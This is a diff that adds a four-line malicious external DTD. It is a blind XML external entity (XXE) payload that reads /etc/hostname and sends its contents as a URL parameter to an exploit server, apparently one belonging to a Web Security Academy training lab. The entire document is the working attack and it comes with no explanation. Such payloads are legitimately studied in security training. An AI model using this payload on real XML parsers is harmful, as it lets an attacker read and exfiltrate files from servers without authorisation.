@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://exploit-0a35000204f00ae7c0716b4e017f00d0.web-security-academy.net/exploit?type=exfiltration&#x25;x=%file;'>">
+%eval;
+%exfiltrate;
